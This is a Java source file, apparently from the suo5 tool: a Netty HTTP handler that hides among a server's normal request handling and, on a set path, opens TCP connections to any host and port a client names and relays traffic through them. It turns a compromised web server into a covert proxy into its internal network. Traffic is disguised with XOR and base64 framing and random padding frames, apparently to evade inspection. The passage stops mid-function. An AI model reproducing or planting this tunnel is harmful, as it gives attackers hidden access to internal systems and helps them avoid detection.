import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.DefaultHttpContent;
import io.netty.handler.codec.http.DefaultHttpResponse;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpHeaderValues;
import io.netty.handler.codec.http.HttpMessage;
import io.netty.handler.codec.http.HttpObject;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpServerCodec;
import io.netty.handler.codec.http.HttpUtil;
import io.netty.handler.codec.http.HttpVersion;
import io.netty.handler.codec.http.LastHttpContent;
import io.netty.util.AttributeKey;

import java.lang.reflect.Method;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.nio.charset.Charset;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

// suo5 handler for raw netty http server
// pipeline: HttpServerCodec -> Suo5NettyHandler -> HttpObjectAggregator -> biz handler
// non-suo5 requests are passed through untouched
public class Suo5NettyHandler extends ChannelInboundHandlerAdapter {

    private static final int BUF_SIZE = 16 * 1024;
    private static final int MAX_BODY = 32 * 1024 * 1024;
    private static final int PROBE_LIMIT = 64 * 1024;
    // client default max-body-size is 512KB, frame adds ~1.4x overhead after encode
    private static final int HARD_FRAME_LIMIT = 4 * 1024 * 1024;
    private static final int CONNECT_TIMEOUT_MS = 4000;
    private static final long HANDSHAKE_GAP_MS = 2000L;
    private static final long IDLE_TIMEOUT_MS = 300L * 1000L;
    private static final int CLASSIC_BATCH_LIMIT = 512 * 1024;

    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final Charset ASCII = Charset.forName("US-ASCII");
    private static final byte[] EMPTY = new byte[0];

    private static final byte AC_CREATE = 0x00;
    private static final byte AC_DATA = 0x01;
    private static final byte AC_DELETE = 0x02;
    private static final byte AC_STATUS = 0x03;
    private static final byte AC_HEARTBEAT = 0x10;
    private static final byte AC_DIRTY = 0x11;

    private static final byte M_CHECK = 0x00;
    private static final byte M_FULL = 0x01;
    private static final byte M_HALF = 0x02;
    private static final byte M_CLASSIC = 0x03;

    private static final ConcurrentHashMap<String, Tunnel> TUNNELS = new ConcurrentHashMap<String, Tunnel>();
    private static final ConcurrentHashMap<String, Integer> DIRTY = new ConcurrentHashMap<String, Integer>();
    private static volatile boolean CLEANER_STARTED = false;

    private static final AttributeKey STATE_KEY = AttributeKey.valueOf("suo5.state");
    private static final String HANDLER_NAME = "suo5";
    private static final String DEFAULT_PATH = "/suo5";

    private static final Object B64_ENC = initEncoder();
    private static final Object B64_DEC = initDecoder();
    private static final Method M_ENCODE_TO_STRING = findMethod(B64_ENC, "encodeToString", byte[].class);
    private static final Method M_ENCODE = findMethod(B64_ENC, "encode", byte[].class);
    private static final Method M_DECODE = findMethod(B64_DEC, "decode", String.class);
    private static final Method M_DECODE_BUFFER = findMethod(B64_DEC, "decodeBuffer", String.class);

    private static final ThreadLocal RANDOM = new ThreadLocal() {
        protected Object initialValue() {
            return new Random();
        }
    };

    // route: only requests matching this path are handled as suo5
    private final String path;

    public Suo5NettyHandler() {
        this(DEFAULT_PATH);
    }

    public Suo5NettyHandler(String path) {
        this.path = path == null || path.length() == 0 ? DEFAULT_PATH : path;
    }

    @Override
    public void handlerAdded(ChannelHandlerContext ctx) {
        startCleaner();
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (!(msg instanceof HttpObject)) {
            ctx.fireChannelRead(msg);
            return;
        }

        State st = (State) ctx.channel().attr(STATE_KEY).get();

        if (st != null && st.phase == State.PASS) {
            ctx.fireChannelRead(msg);
            return;
        }

        if (msg instanceof HttpRequest) {
            // some frameworks (reactor-netty) run with autoRead=false for backpressure
            ctx.channel().config().setAutoRead(true);
            ctx.read();

            State s = new State((HttpRequest) msg);
            if (!matchesPath(s.req)) {
                s.phase = State.PASS;
                ctx.fireChannelRead(msg);
                return;
            }
            ctx.channel().attr(STATE_KEY).set(s);

            if (msg instanceof LastHttpContent) {
                s.phase = State.PASS;
                ctx.fireChannelRead(msg);
                clearIfSame(ctx, s);
            }
            return;
        }

        HttpContent content = (HttpContent) msg;
        if (st == null) {
            ctx.fireChannelRead(msg);
            return;
        }

        if (st.phase == State.SUO5) {
            onSuo5Content(ctx, st, content);
            return;
        }

        probe(ctx, st, content);
    }

    private boolean matchesPath(HttpRequest req) {
        String uri = req.uri();
        if (uri == null) {
            return false;
        }
        int q = uri.indexOf('?');
        String p = q >= 0 ? uri.substring(0, q) : uri;
        return p.equals(path) || p.endsWith(path);
    }

    // decode the first frame, if it looks like suo5 take over the request,
    // otherwise pass everything to the aggregator untouched
    private void probe(ChannelHandlerContext ctx, State st, HttpContent content) throws Exception {
        int readable = content.content().readableBytes();

        int knownLen = frameLength(st.probe.toByteArray());
        if (knownLen < 0 || knownLen > HARD_FRAME_LIMIT) {
            switchToPass(ctx, st, content);
            return;
        }
        if (knownLen == 0 && st.probe.size() + readable > PROBE_LIMIT) {
            switchToPass(ctx, st, content);
            return;
        }

        if (readable > 0) {
            byte[] tmp = new byte[readable];
            content.content().getBytes(content.content().readerIndex(), tmp);
            st.probe.write(tmp, 0, tmp.length);
        }

        byte[] head = st.probe.toByteArray();
        int frameLen = frameLength(head);
        if (frameLen > 0 && head.length >= frameLen) {
            Map first = null;
            try {
                FrameDecoder d = new FrameDecoder();
                d.feed(head, 0, head.length);
                byte[] payload = d.next();
                if (payload != null) {
                    first = unmarshal(payload);
                }
            } catch (Exception ignore) {
            }
            if (first != null && first.containsKey("ac") && first.containsKey("id") && first.containsKey("m")) {
                st.phase = State.SUO5;
                synchronized (st) {
                    st.decoder.feed(head, 0, head.length);
                }
                st.probe.reset();
                st.executor = newWorker(ctx.channel().id().asShortText());

                final boolean last = content instanceof LastHttpContent;
                content.release();
                st.executor.execute(new Runnable() {
                    public void run() {
                        try {
                            byte[] payload;
                            while (true) {
                                synchronized (st) {
                                    payload = st.decoder.next();
                                }
                                if (payload == null) {
                                    break;
                                }
                                dispatch(ctx, st, unmarshal(payload));
                            }
                            if (last) {
                                onEnd(ctx, st);
                            }
                        } catch (Exception ignore) {
                        }
                    }
                });
                return;
            }

            switchToPass(ctx, st, content);
            return;
        }

        if (content instanceof LastHttpContent) {
            switchToPass(ctx, st, content);
            return;
        }
        content.release();
        ctx.read();
    }

    private void switchToPass(ChannelHandlerContext ctx, State st, HttpContent current) {
        st.phase = State.PASS;
        ctx.fireChannelRead(st.req);
        if (st.probe.size() > 0) {
            ctx.fireChannelRead(new DefaultHttpContent(Unpooled.wrappedBuffer(st.probe.toByteArray())));
            st.probe.reset();
        }
        ctx.fireChannelRead(current);
        clearIfSame(ctx, st);
    }

    private static void clearIfSame(ChannelHandlerContext ctx, State st) {
        if (ctx.channel().attr(STATE_KEY).get() == st) {
            ctx.channel().attr(STATE_KEY).set(null);
        }
    }

    private static int frameLength(byte[] head) {
        if (head.length < 8) {
            return 0;
        }
        try {
            byte[] hdr = b64dec(new String(head, 0, 8, ASCII));
            if (hdr.length != 6) {
                return -1;
            }
            int o0 = hdr[0] & 0xff;
            int o1 = hdr[1] & 0xff;
            long n = (((hdr[2] ^ (byte) o0) & 0xffL) << 24)
                    | (((hdr[3] ^ (byte) o1) & 0xffL) << 16)
                    | (((hdr[4] ^ (byte) o0) & 0xffL) << 8)
                    | ((hdr[5] ^ (byte) o1) & 0xffL);
            if (n <= 0 || n > HARD_FRAME_LIMIT) {
                return -1;
            }
            return 8 + (int) n;
        } catch (Exception e) {
            return -1;
        }
    }

    private void onSuo5Content(ChannelHandlerContext ctx, State st, HttpContent content) {
        int readable = content.content().readableBytes();
        final byte[] tmp;
        if (readable > 0) {
            tmp = new byte[readable];
            content.content().getBytes(content.content().readerIndex(), tmp);
        } else {
            tmp = EMPTY;
        }
        final boolean last = content instanceof LastHttpContent;
        content.release();

        st.executor.execute(new Runnable() {
            public void run() {
                try {
                    synchronized (st) {
                        st.decoder.feed(tmp, 0, tmp.length);
                    }
                    byte[] payload;
                    while (true) {
                        synchronized (st) {
                            payload = st.decoder.next();
                        }
                        if (payload == null) {
                            break;
                        }
                        dispatch(ctx, st, unmarshal(payload));
                    }
                    if (last) {
                        onEnd(ctx, st);
                    }
                } catch (Exception ignore) {
                }
            }
        });

        if (!last) {
            ctx.read();
        }
    }

    private void dispatch(ChannelHandlerContext ctx, State st, Map m) throws Exception {
        byte[] modeData = (byte[]) m.get("m");
        byte[] actionData = (byte[]) m.get("ac");
        byte[] idData = (byte[]) m.get("id");
        if (modeData == null || modeData.length == 0) {
            return;
        }
        if (actionData == null || actionData.length != 1 || idData == null || idData.length == 0) {
            return;
        }

        String id = new String(idData, UTF8);
        byte mode = modeData[0];
        byte action = actionData[0];

        switch (mode) {
            case M_CHECK:
                handshake(ctx, st, m, id);
                break;
            case M_FULL:
                fullStream(ctx, st, m, id, action);
                break;
            case M_HALF:
                halfStream(ctx, st, m, id, action);
                break;
            case M_CLASSIC:
                st.classic = true;
                classic(ctx, st, m, id, action);
                break;
            default:
        }
    }

    private void handshake(ChannelHandlerContext ctx, State st, Map m, String echoId) throws Exception {
        String sid = randomString(16);
        st.sid = sid;

        byte[] jk = (byte[]) m.get("jk");
        if (jk != null && jk.length > 0) {
            try {
                DIRTY.put(sid, Math.max(Integer.parseInt(new String(jk, UTF8)), 0));
            } catch (NumberFormatException ignore) {
            }
        }

        byte[] dt = (byte[]) m.get("dt");
        byte[] echo = frame(marshal(dataAction(echoId, dt == null ? EMPTY : dt)));
        byte[] sidFrame = frame(marshal(dataAction(echoId, sid.getBytes(UTF8))));

        byte[] a = (byte[]) m.get("a");
        boolean stream = a != null && a.length > 0 && a[0] == 0x01;

        if (stream) {
            // write echo, wait, write sid so the client can tell streaming from buffered
            startResponse(ctx, st);
            writeChunk(ctx, echo);
            Thread.sleep(HANDSHAKE_GAP_MS);
            writeChunk(ctx, sidFrame);
            endResponse(ctx);
        } else {
            byte[] body = concat(echo, sidFrame);
            FullHttpResponse full = new DefaultFullHttpResponse(
                    HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.wrappedBuffer(body));
            full.headers().set(HttpHeaderNames.CONTENT_TYPE, "application/octet-stream");
            full.headers().setInt(HttpHeaderNames.CONTENT_LENGTH, body.length);
            keepAlive(full, st.req);
            ctx.writeAndFlush(full);
        }
    }

    private void fullStream(ChannelHandlerContext ctx, State st, Map m, String id, byte action) throws Exception {
        switch (action) {
            case AC_CREATE: {
                String host = new String((byte[]) m.get("h"));
                int port = parseInt((byte[]) m.get("p"), 0);
                if (port == 0) {
                    port = localPort(ctx);
                }
                startResponse(ctx, st);

                Tunnel tunnel;
                try {
                    tunnel = Tunnel.create(id);
                    tunnel.connect(host, port, CONNECT_TIMEOUT_MS);
                } catch (Exception e) {
                    writeChunk(ctx, frame(marshal(statusAction(id, (byte) 0x01))));
                    endResponse(ctx);
                    return;
                }

                Tunnel old = TUNNELS.putIfAbsent(id, tunnel);
                if (old != null && old != tunnel) {
                    old.close();
                    TUNNELS.remove(id);
                    TUNNELS.putIfAbsent(id, tunnel);
                }

                tunnel.bindChannel(ctx.channel());
                writeChunk(ctx, frame(marshal(statusAction(id, (byte) 0x00))));
                tunnel.startPump(dirtyOf(st));
                st.tunnel = tunnel;
                st.boundToRequest = true;
                break;
            }
            case AC_DATA: {
                Tunnel tunnel = TUNNELS.get(id);
                byte[] dt = (byte[]) m.get("dt");
                if (tunnel != null && dt != null && dt.length > 0) {
                    tunnel.write(dt);
                }
                break;
            }
            case AC_HEARTBEAT:
                writeChunk(ctx, frame(marshal(heartbeatAction(id))));
                break;
            case AC_DELETE:
                closeTunnel(id);
                break;
            default:
        }
    }

    private void halfStream(ChannelHandlerContext ctx, State st, Map m, String id, byte action) throws Exception {
        switch (action) {
            case AC_CREATE: {
                String host = new String((byte[]) m.get("h"));
                int port = parseInt((byte[]) m.get("p"), 0);
                if (port == 0) {
                    port = localPort(ctx);
                }

                Tunnel existing = TUNNELS.get(id);
                if (existing != null && !existing.isClosed()) {
                    startResponse(ctx, st);
                    writeChunk(ctx, frame(marshal(statusAction(id, (byte) 0x00))));
                    return;
                }

                startResponse(ctx, st);
                Tunnel tunnel;
                try {
                    tunnel = Tunnel.create(id);
                    tunnel.connect(host, port, CONNECT_TIMEOUT_MS);
                } catch (Exception e) {
                    writeChunk(ctx, frame(marshal(statusAction(id, (byte) 0x01))));
                    endResponse(ctx);
                    return;
                }
                TUNNELS.putIfAbsent(id, tunnel);

                tunnel.bindChannel(ctx.channel());
                writeChunk(ctx, frame(marshal(statusAction(id, (byte) 0x00))));
                tunnel.startPump(dirtyOf(st));
                // response is owned by the tunnel reader thread, don't close it at request end
                st.tunnel = tunnel;
                st.holdResponse = true;
                break;
            }
            case AC_DATA: {
                Tunnel tunnel = TUNNELS.get(id);
                byte[] dt = (byte[]) m.get("dt");
                if (tunnel != null && dt != null && dt.length > 0) {
                    tunnel.write(dt);
                }
                emptyOk(ctx, st);
                break;
            }
            case AC_HEARTBEAT:
                if (st.responseStarted) {
                    writeChunk(ctx, frame(marshal(heartbeatAction(id))));
                } else {
                    emptyOk(ctx, st);
                }
                break;
            case AC_DELETE:
                closeTunnel(id);
                if (!st.responseStarted) {
                    emptyOk(ctx, st);
                }
                break;
            default:
                if (!st.responseStarted) {
                    emptyOk(ctx, st);
                }
        }
    }

    private void classic(ChannelHandlerContext ctx, State st, Map m, String id, byte action) throws Exception {
        switch (action) {
            case AC_CREATE: {
                String host = new String((byte[]) m.get("h"));
                int port = parseInt((byte[]) m.get("p"), 0);
                if (port == 0) {
                    port = localPort(ctx);
                }

                Tunnel existing = TUNNELS.get(id);
                if (existing != null && !existing.isClosed()) {
                    existing.touch();
                    st.out.write(frame(marshal(statusAction(id, (byte) 0x00))));
                    return;
                }

                Tunnel tunnel;
                try {
                    tunnel = Tunnel.create(id);
                    tunnel.connect(host, port, CONNECT_TIMEOUT_MS);
                } catch (Exception e) {
                    st.out.write(frame(marshal(statusAction(id, (byte) 0x01))));
                    return;
                }
                TUNNELS.putIfAbsent(id, tunnel);
                tunnel.startQueueReader();
                st.out.write(frame(marshal(statusAction(id, (byte) 0x00))));
                break;
            }
            case AC_DATA: {
                Tunnel tunnel = TUNNELS.get(id);
                if (tunnel == null) {
                    st.out.write(frame(marshal(deleteAction(id))));
                    return;
                }
                byte[] dt = (byte[]) m.get("dt");
                if (dt != null && dt.length > 0) {
                    try {
                        tunnel.write(dt);
                    } catch (Exception e) {
                        closeTunnel(id);
                        st.out.write(frame(marshal(deleteAction(id))));
                        return;
                    }
                }
                drain(tunnel, st.out, id);
                break;
            }
            case AC_DELETE:
                closeTunnel(id);
                break;
            case AC_HEARTBEAT:
                st.out.write(frame(marshal(heartbeatAction(id))));
                break;
            default:
        }
    }

    private void drain(Tunnel tunnel, ByteArrayOutputStream out, String id) throws Exception {
        int written = 0;
        while (written < CLASSIC_BATCH_LIMIT) {
            byte[] data = tunnel.queue.poll();
            if (data == null) {
                break;
            }
            if (data == Tunnel.DELETE_MARK) {
                TUNNELS.remove(id);
                out.write(frame(marshal(deleteAction(id))));
                return;
            }
            out.write(frame(marshal(dataAction(id, data))));
            written += data.length;
        }
        // socket closed and queue empty, tell the client to clean up
        if (tunnel.isClosed() && tunnel.queue.isEmpty()) {
            TUNNELS.remove(id);
            out.write(frame(marshal(deleteAction(id))));
        }
    }

    private void onEnd(ChannelHandlerContext ctx, State st) {
        synchronized (st) {
            if (st.ended) {
                return;
            }
            st.ended = true;
        }

        if (st.executor != null) {
            st.executor.shutdown();
        }

        if (st.holdResponse) {
            return;
        }

        if (st.classic && !st.responseWritten) {
            byte[] body = st.out.toByteArray();
            FullHttpResponse full = new DefaultFullHttpResponse(
                    HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.wrappedBuffer(body));
            full.headers().set(HttpHeaderNames.CONTENT_TYPE, "application/octet-stream");
            full.headers().setInt(HttpHeaderNames.CONTENT_LENGTH, body.length);
            keepAlive(full, st.req);
            ctx.writeAndFlush(full);
            st.responseWritten = true;
            st.out.reset();
        }

        if (st.tunnel != null && st.boundToRequest) {
            closeTunnel(st.tunnel.id);
        }
        if (st.responseStarted && !st.responseEnded) {
            endResponse(ctx);
            st.responseEnded = true;
        }
        if (!st.holdResponse) {
            clearIfSame(ctx, st);
        }
    }

    private void startResponse(ChannelHandlerContext ctx, State st) {
        if (st.responseStarted) {
            return;
        }
        st.responseStarted = true;

        DefaultHttpResponse resp = new DefaultHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);
        resp.headers().set(HttpHeaderNames.CONTENT_TYPE, "application/octet-stream");
        resp.headers().set(HttpHeaderNames.CACHE_CONTROL, "no-transform");
        resp.headers().set("X-Accel-Buffering", "no");
        // no content-length, the codec picks chunked
        keepAlive(resp, st.req);
        ctx.writeAndFlush(resp);
    }

    private void endResponse(ChannelHandlerContext ctx) {
        ctx.writeAndFlush(LastHttpContent.EMPTY_LAST_CONTENT)
                .addListener(ChannelFutureListener.CLOSE);
    }

    private void writeChunk(ChannelHandlerContext ctx, byte[] data) {
        if (data == null || data.length == 0) {
            return;
        }
        ctx.writeAndFlush(new DefaultHttpContent(Unpooled.wrappedBuffer(data)));
    }

    private void emptyOk(ChannelHandlerContext ctx, State st) {
        // one response per request, half mode body may carry multiple frames
        if (st.emptyOkSent || st.responseStarted) {
            return;
        }
        st.emptyOkSent = true;

        FullHttpResponse full = new DefaultFullHttpResponse(
                HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.EMPTY_BUFFER);
        full.headers().setInt(HttpHeaderNames.CONTENT_LENGTH, 0);
        keepAlive(full, st.req);
        ctx.writeAndFlush(full);
    }

    private static void keepAlive(HttpMessage resp, HttpRequest req) {
        if (req != null && HttpUtil.isKeepAlive(req)) {
            resp.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);
        } else {
            resp.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.CLOSE);
        }
    }

    private static int localPort(ChannelHandlerContext ctx) {
        SocketAddress a = ctx.channel().localAddress();
        if (a instanceof InetSocketAddress) {
            return ((InetSocketAddress) a).getPort();
        }
        return 80;
    }

    private static int dirtyOf(State st) {
        if (st.sid == null) {
            return 0;
        }
        Integer v = DIRTY.get(st.sid);
        return v == null ? 0 : v;
    }

    private static void closeTunnel(String id) {
        Tunnel t = TUNNELS.remove(id);
        if (t != null) {
            t.close();
        }
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        State st = (State) ctx.channel().attr(STATE_KEY).get();
        if (st != null) {
            if (st.executor != null) {
                st.executor.shutdownNow();
            }
            if (st.tunnel != null && st.boundToRequest) {
                closeTunnel(st.tunnel.id);
            }
        }
        ctx.channel().attr(STATE_KEY).set(null);
        super.channelInactive(ctx);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
        State st = (State) ctx.channel().attr(STATE_KEY).get();
        if (st != null && st.tunnel != null && st.boundToRequest) {
            closeTunnel(st.tunnel.id);
        }
        ctx.close();
    }

    private static void startCleaner() {
        if (CLEANER_STARTED) {
            return;
        }
        synchronized (Suo5NettyHandler.class) {
            if (CLEANER_STARTED) {
                return;
            }
            CLEANER_STARTED = true;

            Thread th = new Thread(new Runnable() {
                public void run() {
                    while (true) {
                        try {
                            Thread.sleep(30_000L);
                        } catch (InterruptedException e) {
                            return;
                        }
                        Iterator it = TUNNELS.entrySet().iterator();
                        while (it.hasNext()) {
                            Map.Entry entry = (Map.Entry) it.next();
                            Tunnel t = (Tunnel) entry.getValue();
                            if (t.isClosed() || t.idleMillis() > IDLE_TIMEOUT_MS) {
                                t.close();
                                it.remove();
                            }
                        }
                        if (DIRTY.size() > 4096) {
                            DIRTY.clear();
                        }
                    }
                }
            }, "suo5-cleaner");
            th.setDaemon(true);
            th.start();
        }
    }

    static final class State {
        static final int PROBING = 0;
        static final int SUO5 = 1;
        static final int PASS = 2;

        final HttpRequest req;
        final FrameDecoder decoder = new FrameDecoder();
        final ByteArrayOutputStream probe = new ByteArrayOutputStream();
        final ByteArrayOutputStream out = new ByteArrayOutputStream();

        ExecutorService executor;
        Tunnel tunnel;
        String sid;
        int phase = PROBING;
        boolean classic;
        boolean responseStarted;
        boolean responseWritten;
        boolean responseEnded;
        boolean emptyOkSent;
        boolean holdResponse;
        boolean boundToRequest;
        boolean ended;

        State(HttpRequest req) {
            this.req = req;
        }
    }

    private static ExecutorService newWorker(final String name) {
        final AtomicInteger n = new AtomicInteger();
        return Executors.newSingleThreadExecutor(new ThreadFactory() {
            public Thread newThread(Runnable r) {
                Thread t = new Thread(r, "suo5-handler-" + name + "-" + n.incrementAndGet());
                t.setDaemon(true);
                return t;
            }
        });
    }

    // tunnel = one tcp connection to the target plus its reader thread.
    // full/half push frames straight into the channel, classic queues them
    // for the next poll request
    static final class Tunnel {
        static final byte[] DELETE_MARK = new byte[0];

        final String id;
        final BlockingQueue<byte[]> queue = new LinkedBlockingQueue<byte[]>();

        private final AtomicBoolean closed = new AtomicBoolean(false);
        private volatile long lastActive = System.currentTimeMillis();
        private volatile Channel pushChannel;
        private volatile int dirtySize;

        Socket socket;
        OutputStream socketOut;

        Tunnel(String id) {
            this.id = id;
        }

        static Tunnel create(String id) {
            return new Tunnel(id);
        }

        void connect(String host, int port, int timeoutMs) throws IOException {
            Socket s = new Socket();
            s.setTcpNoDelay(true);
            s.setReceiveBufferSize(128 * 1024);
            s.setSendBufferSize(128 * 1024);
            s.connect(new InetSocketAddress(host, port), timeoutMs);
            this.socket = s;
            this.socketOut = s.getOutputStream();
        }

        boolean isClosed() {
            return closed.get() || socket == null || socket.isClosed();
        }

        void touch() {
            lastActive = System.currentTimeMillis();
        }

        long idleMillis() {
            return System.currentTimeMillis() - lastActive;
        }

        void bindChannel(Channel ch) {
            this.pushChannel = ch;
        }

        void setDirtySize(int n) {
            this.dirtySize = Math.max(n, 0);
        }

        void write(byte[] data) throws IOException {
            if (data.length == 0) {
                return;
            }
            synchronized (socketOut) {
                socketOut.write(data);
                socketOut.flush();
            }
            touch();
        }

        void startPump(final int dirty) {
            Thread t = new Thread(new Runnable() {
                public void run() {
                    byte[] buf = new byte[BUF_SIZE];
                    try {
                        InputStream in = socket.getInputStream();
                        while (!isClosed()) {
                            int n = in.read(buf);
                            if (n <= 0) {
                                break;
                            }
                            byte[] data = new byte[n];
                            System.arraycopy(buf, 0, data, 0, n);
                            touch();
                            pushFrame(data, dirty);
                        }
                    } catch (Throwable ignore) {
                    } finally {
                        close();
                        pushDelete();
                    }
                }
            }, "suo5-pump-" + id);
            t.setDaemon(true);
            t.start();
        }

        private void pushFrame(byte[] data, int dirty) {
            Channel ch = pushChannel;
            if (ch == null || !ch.isActive()) {
                return;
            }
            // wait for writability instead of buffering unbounded
            long deadline = System.currentTimeMillis() + 60_000L;
            while (!ch.isWritable() && ch.isActive() && System.currentTimeMillis() < deadline) {
                try {
                    Thread.sleep(5);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
            if (!ch.isActive()) {
                return;
            }

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            byte[] f = frame(marshal(dataAction(id, data)));
            buf.write(f, 0, f.length);
            if (dirty > 0) {
                byte[] d = frame(marshal(dirtyAction(randomBytes(dirty))));
                buf.write(d, 0, d.length);
            }
            ch.writeAndFlush(new DefaultHttpContent(Unpooled.wrappedBuffer(buf.toByteArray())));
        }

        private void pushDelete() {
            Channel ch = pushChannel;
            if (ch == null || !ch.isActive()) {
                return;
            }
            ch.writeAndFlush(new DefaultHttpContent(Unpooled.wrappedBuffer(
                    frame(marshal(deleteAction(id))))))
                    .addListener(ChannelFutureListener.CLOSE);
        }

        void startQueueReader() {
            Thread t = new Thread(new Runnable() {
                public void run() {
                    byte[] buf = new byte[BUF_SIZE];
                    try {
                        InputStream in = socket.getInputStream();
                        while (!isClosed()) {
                            int n = in.read(buf);
                            if (n <= 0) {
                                break;
                            }
                            byte[] data = new byte[n];
                            System.arraycopy(buf, 0, data, 0, n);
                            touch();
                            if (!queue.offer(data, 60, TimeUnit.SECONDS)) {
                                break;
                            }
                        }
                    } catch (Throwable ignore) {
                    } finally {
                        close();
                    }
                }
            }, "suo5-read-" + id);
            t.setDaemon(true);
            t.start();
        }

        void close() {
            if (!closed.compareAndSet(false, true)) {
                return;
            }
            try {
                if (socket != null) {
                    socket.close();
                }
            } catch (Exception ignore) {
            }
            queue.offer(DELETE_MARK);
        }
    }

    static final class FrameDecoder {
        private byte[] buf = new byte[1024];
        private int len;

        int peekLen() {
            return len;
        }

        void feed(byte[] data, int off, int n) {
            if (len + n > buf.length) {
                byte[] nb = new byte[Math.max(buf.length * 2, len + n)];
                System.arraycopy(buf, 0, nb, 0, len);
                buf = nb;
            }
            System.arraycopy(data, off, buf, len, n);
            len += n;
        }

        byte[] next() throws IOException {
            if (len < 8) {
                return null;
            }
            byte[] hdr;
            try {
                hdr = b64dec(new String(buf, 0, 8, ASCII));
            } catch (Exception e) {
                throw new IOException("bad frame header");
            }
            if (hdr.length != 6) {
                throw new IOException("invalid header length");
            }

            int o0 = hdr[0] & 0xff;
            int o1 = hdr[1] & 0xff;
            long n = (((hdr[2] ^ (byte) o0) & 0xffL) << 24)
                    | (((hdr[3] ^ (byte) o1) & 0xffL) << 16)
                    | (((hdr[4] ^ (byte) o0) & 0xffL) << 8)
                    | ((hdr[5] ^ (byte) o1) & 0xffL);
            if (n <= 0 || n > MAX_BODY) {
                throw new IOException("frame too big: " + n);
            }
            if (len < 8 + n) {
                return null;
            }

            byte[] body;
            try {
                body = b64dec(new String(buf, 8, (int) n, ASCII));
            } catch (Exception e) {
                throw new IOException("bad frame body");
            }
            for (int i = 0; i < body.length; i++) {
                body[i] ^= (byte) ((i % 2 == 0) ? o0 : o1);
            }

            int consumed = 8 + (int) n;
            System.arraycopy(buf, consumed, buf, 0, len - consumed);
            len -= consumed;
            return body;
        }
    }

    static byte[] marshal(Map m) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Iterator it = m.entrySet().iterator();
        while (it.hasNext()) {
            Map.Entry e = (Map.Entry) it.next();
            byte[] k = ((String) e.getKey()).getBytes(UTF8);
            byte[] v = e.getValue() == null ? EMPTY : (byte[]) e.getValue();
            out.write(k.length & 0xff);
            out.write(k, 0, k.length);
            out.write((v.length >>> 24) & 0xff);
            out.write((v.length >>> 16) & 0xff);
            out.write((v.length >>> 8) & 0xff);
            out.write(v.length & 0xff);
            out.write(v, 0, v.length);
        }
        return out.toByteArray();
    }

    static Map unmarshal(byte[] bs) throws IOException {
        Map m = new LinkedHashMap();
        int total = bs.length;
        int i = 0;
        while (i < total) {
            int kLen = bs[i] & 0xff;
            i += 1;
            if (i + kLen > total) {
                throw new IOException("unexpected eof when read key");
            }
            String key = new String(bs, i, kLen, UTF8);
            i += kLen;

            if (i + 4 > total) {
                throw new IOException("unexpected eof when read value size");
            }
            int vLen = ((bs[i] & 0xff) << 24) | ((bs[i + 1] & 0xff) << 16)
                    | ((bs[i + 2] & 0xff) << 8) | (bs[i + 3] & 0xff);
            i += 4;
            if (vLen < 0 || vLen > MAX_BODY || i + vLen > total) {
                throw new IOException("unexpected eof when read value");
            }
            byte[] v = new byte[vLen];
            System.arraycopy(bs, i, v, 0, vLen);
            i += vLen;
            m.put(key, v);
        }
        return m;
    }

    static byte[] frame(byte[] payload) {
        byte[] obs = randomBytes(2);

        byte[] x = payload.clone();
        for (int i = 0; i < x.length; i++) {
            x[i] ^= obs[i % 2];
        }
        byte[] body = b64enc(x);

        byte[] hdr = new byte[6];
        hdr[0] = obs[0];
        hdr[1] = obs[1];
        int len = body.length;
        hdr[2] = (byte) (len >>> 24);
        hdr[3] = (byte) (len >>> 16);
        hdr[4] = (byte) (len >>> 8);
        hdr[5] = (byte) len;
        for (int i = 2; i < 6; i++) {
            hdr[i] ^= obs[i % 2];
        }
        byte[] head = b64enc(hdr);
        return concat(head, body);
    }

    static Map dataAction(String id, byte[] dt) {
        Map m = new LinkedHashMap();
        m.put("ac", new byte[]{AC_DATA});
        m.put("id", id.getBytes(UTF8));
        m.put("dt", dt);
        return m;
    }

    static Map deleteAction(String id) {
        Map m = new LinkedHashMap();
        m.put("ac", new byte[]{AC_DELETE});
        m.put("id", id.getBytes(UTF8));
        return m;
    }

    static Map statusAction(String id, byte s) {
        Map m = new LinkedHashMap();
        m.put("ac", new byte[]{AC_STATUS});
        m.put("id", id.getBytes(UTF8));
        m.put("s", new byte[]{s});
        return m;
    }

    static Map heartbeatAction(String id) {
        Map m = new LinkedHashMap();
        m.put("ac", new byte[]{AC_HEARTBEAT});
        m.put("id", id.getBytes(UTF8));
        return m;
    }

    static Map dirtyAction(byte[] d) {
        Map m = new LinkedHashMap();
        m.put("ac", new byte[]{AC_DIRTY});
        m.put("d", d);
